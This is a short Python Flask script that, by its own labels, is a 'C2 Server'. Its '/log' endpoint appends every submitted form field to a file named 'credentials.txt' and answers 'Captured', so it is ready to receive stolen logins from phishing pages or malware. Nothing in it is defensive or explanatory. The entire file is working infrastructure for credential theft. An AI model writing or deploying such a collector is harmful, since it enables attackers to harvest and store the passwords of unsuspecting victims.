from flask import Flask, request
import datetime

app = Flask(__name__)

@app.route('/log', methods=['POST'])
def log():
    data = request.form.to_dict()
    with open("credentials.txt", "a") as f:
        f.write(f"{datetime.datetime.now()} - {data}\n")
    return "Captured"

@app.route("/", methods=["GET"])
def home():
    return "C2 Server is running"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
